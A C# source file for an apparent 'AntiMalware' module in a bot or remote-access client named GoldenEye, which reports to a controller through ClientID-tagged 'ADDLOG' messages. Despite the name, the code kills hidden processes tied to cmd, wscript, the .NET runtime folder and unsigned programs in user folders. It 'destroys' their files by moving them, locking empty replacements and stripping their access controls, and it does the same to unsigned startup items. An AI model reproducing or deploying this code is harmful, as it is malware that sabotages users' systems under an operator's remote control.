using Microsoft.VisualBasic;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Windows.Forms;

namespace GoldenEye.Functions
{
    public class AntiMalware
    {
        public MainWorker mwork;
        private int killed = 0;
        private int fileskilled = 0;
        public string excparams = string.Empty;

        public void Start()
        {
            mwork.addinfo("[Anti Malware] Execution Parameters:" + excparams);
            mwork.addinfo("[Anti Malware] Successfully started Malware Cleaner...");
            try
            {
                try
                {
                    Process[] Proc = Process.GetProcesses();
                    string path;
                    for (int x = 0; x <= Proc.Length - 1; x++)
                    {
                        Process p = Proc[x];
                        try
                        {
                            path = System.IO.Path.GetFullPath(p.MainModule.FileName);
                            if (IsFileMalicious(path))
                            {
                                if (!WindowIsVisible(p.MainWindowTitle))
                                {
                                    try
                                    {
                                        p.Kill();
                                        mwork.addlog("[Anti Malware] Killed Process: " + p.ProcessName);
                                    }
                                    catch
                                    {
                                    }
                                    DestroyFile(path);
                                    killed = killed + 1;
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }

                string[] tehfilesandshit = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                foreach (var workload in tehfilesandshit)
                {
                    if (WinTrust.VerifyEmbeddedSignature(workload) == false)
                    {
                        System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(workload);
                        DirectorySecurity FolderAcl = new DirectorySecurity();
                        FolderAcl.SetAccessRuleProtection(true, false);
                        FolderInfo.SetAccessControl(FolderAcl);
                        mwork.addlog("[Anti Malware] Removed Startup Item: " + workload);
                    }
                }
            }
            catch { }

            string priority = "";
            if (killed == 0)
            {
                priority = "Info";
            }
            else if (killed == 1)
            {
                priority = "Log";
            }
            else if (killed > 2)
            {
                priority = "Priority";
            }
            else if (killed > 5)
            {
                priority = "Risk";
            }
            mwork.Send("ADDLOG|" + mwork.ClientID + "|" + priority + "|" + "Successfully finished Anti Malware Task. Processes killed: " + killed.ToString() + ".");
            mwork.addinfo("[Anti Malware] Processes killed: " + killed.ToString());
            mwork.addinfo("[Anti Malware] Files destroyed: " + fileskilled.ToString());
            mwork.addinfo("[Anti Malware] Successfully finished the Malware Cleaning!");
        }

        public bool IsFileMalicious(string fileloc)
        {
            if (fileloc.Contains(Application.ExecutablePath))
                return false;
            if (fileloc.Contains("cmd"))
                return true;
            if (fileloc.Contains("wscript"))
                return true;
            if (fileloc.Contains(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory()))
                return true;
            if (WinTrust.VerifyEmbeddedSignature(fileloc) == true)
                return false;
            if ((fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))))
                return true;
            FileAttributes attributes;
            attributes = File.GetAttributes(fileloc);
            if ((attributes & FileAttributes.System) == FileAttributes.System)
                return true;
            if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                return true;
            return false;
        }

        private bool IsAdmin()
        {
            try
            {
                WindowsIdentity id = WindowsIdentity.GetCurrent();

                WindowsPrincipal p = new WindowsPrincipal(id);

                return p.IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        private bool WindowIsVisible(string WinTitle)
        {
            try
            {
                IntPtr lHandle;
                lHandle = FindWindow(Constants.vbNullString, WinTitle);
                return IsWindowVisible(lHandle);
            }
            catch
            {
                return false;
            }
        }

        private void DestroyFile(string path)
        {
            try
            {
                if (System.IO.File.Exists(path))
                {
                    Random r = new Random();
                    try
                    {
                        File.Move(path, System.IO.Path.GetTempPath() + r.Next(500, 9000));
                        System.IO.File.WriteAllText(path, string.Empty);
                        FileSystem.FileOpen(FileSystem.FreeFile(), path, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite);
                        System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(path);
                        DirectorySecurity FolderAcl = new DirectorySecurity();
                        FolderAcl.SetAccessRuleProtection(true, false);
                        FolderInfo.SetAccessControl(FolderAcl);
                        mwork.addlog("[Anti Malware] Destroyed File at: " + path);
                        fileskilled = fileskilled + 1;
                    }
                    catch
                    {
                        mwork.adderror("[Anti Malware] Error while destroying File!");
                        mwork.adderror("[Anti Malware] Executing minimal destroy File Function..");
                        System.IO.DirectoryInfo FolderInfo = new System.IO.DirectoryInfo(path);
                        DirectorySecurity FolderAcl = new DirectorySecurity();
                        FolderAcl.SetAccessRuleProtection(true, false);
                        FolderInfo.SetAccessControl(FolderAcl);
                        mwork.addlog("[Anti Malware] Destroyed (low) File at: " + path);
                        fileskilled = fileskilled + 1;
                    }
                }
            }
            catch
            {
            }
        }

        [DllImport("wintrust.dll", ExactSpelling = true, SetLastError = false, CharSet = CharSet.Unicode)]
        private static extern WinVerifyTrustResult WinVerifyTrust(
     [In] IntPtr hwnd,
     [In] [MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID,
     [In] WinTrustData pWVTData
);
    }

    #region WinTrustData struct field enums

    internal enum WinTrustDataUIChoice : uint
    {
        All = 1,
        None = 2,
        NoBad = 3,
        NoGood = 4
    }

    internal enum WinTrustDataRevocationChecks : uint
    {
        None = 0x00000000,
        WholeChain = 0x00000001
    }

    internal enum WinTrustDataChoice : uint
    {
        File = 1,
        Catalog = 2,
        Blob = 3,
        Signer = 4,
        Certificate = 5
    }

    internal enum WinTrustDataStateAction : uint
    {
        Ignore = 0x00000000,
        Verify = 0x00000001,
        Close = 0x00000002,
        AutoCache = 0x00000003,
        AutoCacheFlush = 0x00000004
    }

    [FlagsAttribute]
    internal enum WinTrustDataProvFlags : uint
    {
        UseIe4TrustFlag = 0x00000001,
        NoIe4ChainFlag = 0x00000002,
        NoPolicyUsageFlag = 0x00000004,
        RevocationCheckNone = 0x00000010,
        RevocationCheckEndCert = 0x00000020,
        RevocationCheckChain = 0x00000040,
        RevocationCheckChainExcludeRoot = 0x00000080,
        SaferFlag = 0x00000100,        // Used by software restriction policies. Should not be used.
        HashOnlyFlag = 0x00000200,
        UseDefaultOsverCheck = 0x00000400,
        LifetimeSigningFlag = 0x00000800,
        CacheOnlyUrlRetrieval = 0x00001000,      // affects CRL retrieval and AIA retrieval
        DisableMD2andMD4 = 0x00002000      // Win7 SP1+: Disallows use of MD2 or MD4 in the chain except for the root
    }

    internal enum WinTrustDataUIContext : uint
    {
        Execute = 0,
        Install = 1
    }

    #endregion WinTrustData struct field enums

    #region WinTrust structures

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal class WinTrustFileInfo
    {
        private UInt32 StructSize = (UInt32)Marshal.SizeOf(typeof(WinTrustFileInfo));
        private IntPtr pszFilePath;                     // required, file name to be verified
        private IntPtr hFile = IntPtr.Zero;             // optional, open handle to FilePath
        private IntPtr pgKnownSubject = IntPtr.Zero;    // optional, subject type if it is known

        public WinTrustFileInfo(String _filePath)
        {
            pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
        }

        ~WinTrustFileInfo()
        {
            Marshal.FreeCoTaskMem(pszFilePath);
        }
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    internal class WinTrustData
    {
        private UInt32 StructSize = (UInt32)Marshal.SizeOf(typeof(WinTrustData));
        private IntPtr PolicyCallbackData = IntPtr.Zero;
        private IntPtr SIPClientData = IntPtr.Zero;

        // required: UI choice
        private WinTrustDataUIChoice UIChoice = WinTrustDataUIChoice.None;

        // required: certificate revocation check options
        private WinTrustDataRevocationChecks RevocationChecks = WinTrustDataRevocationChecks.None;

        // required: which structure is being passed in?
        private WinTrustDataChoice UnionChoice = WinTrustDataChoice.File;

        // individual file
        private IntPtr FileInfoPtr;

        private WinTrustDataStateAction StateAction = WinTrustDataStateAction.Ignore;
        private IntPtr StateData = IntPtr.Zero;
        private String URLReference = null;
        private WinTrustDataProvFlags ProvFlags = WinTrustDataProvFlags.RevocationCheckChainExcludeRoot;
        private WinTrustDataUIContext UIContext = WinTrustDataUIContext.Execute;

        // constructor for silent WinTrustDataChoice.File check
        public WinTrustData(String _fileName)
        {
            // On Win7SP1+, don't allow MD2 or MD4 signatures
            if ((Environment.OSVersion.Version.Major > 6) ||
                ((Environment.OSVersion.Version.Major == 6) && (Environment.OSVersion.Version.Minor > 1)) ||
                ((Environment.OSVersion.Version.Major == 6) && (Environment.OSVersion.Version.Minor == 1) && !String.IsNullOrEmpty(Environment.OSVersion.ServicePack)))
            {
                ProvFlags |= WinTrustDataProvFlags.DisableMD2andMD4;
            }

            WinTrustFileInfo wtfiData = new WinTrustFileInfo(_fileName);
            FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(WinTrustFileInfo)));
            Marshal.StructureToPtr(wtfiData, FileInfoPtr, false);
        }

        ~WinTrustData()
        {
            Marshal.FreeCoTaskMem(FileInfoPtr);
        }
    }

    #endregion WinTrust structures

    internal enum WinVerifyTrustResult : uint
    {
        Success = 0,
        ProviderUnknown = 0x800b0001,           // Trust provider is not recognized on this system
        ActionUnknown = 0x800b0002,         // Trust provider does not support the specified action
        SubjectFormUnknown = 0x800b0003,        // Trust provider does not support the form specified for the subject
        SubjectNotTrusted = 0x800b0004,         // Subject failed the specified verification action
        FileNotSigned = 0x800B0100,         // TRUST_E_NOSIGNATURE - File was not signed
        SubjectExplicitlyDistrusted = 0x800B0111,   // Signer's certificate is in the Untrusted Publishers store
        SignatureOrFileCorrupt = 0x80096010,    // TRUST_E_BAD_DIGEST - file was probably corrupt
        SubjectCertExpired = 0x800B0101,        // CERT_E_EXPIRED - Signer's certificate was expired
        SubjectCertificateRevoked = 0x800B010C,     // CERT_E_REVOKED Subject's certificate was revoked
        UntrustedRoot = 0x800B0109          // CERT_E_UNTRUSTEDROOT - A certification chain processed correctly but terminated in a root certificate that is not trusted by the trust provider.
    }

    internal sealed class WinTrust
    {
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        // GUID of the action to perform
        private const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";

        [DllImport("wintrust.dll", ExactSpelling = true, SetLastError = false, CharSet = CharSet.Unicode)]
        private static extern WinVerifyTrustResult WinVerifyTrust(
            [In] IntPtr hwnd,
            [In] [MarshalAs(UnmanagedType.LPStruct)] Guid pgActionID,
            [In] WinTrustData pWVTData
        );

        // call WinTrust.WinVerifyTrust() to check embedded file signature
        public static bool VerifyEmbeddedSignature(string fileName)
        {
            WinTrustData wtd = new WinTrustData(fileName);
            Guid guidAction = new Guid(WINTRUST_ACTION_GENERIC_VERIFY_V2);
            WinVerifyTrustResult result = WinVerifyTrust(INVALID_HANDLE_VALUE, guidAction, wtd);
            bool ret = (result == WinVerifyTrustResult.Success);
            return ret;
        }

        private WinTrust()
        {
        }
    }
}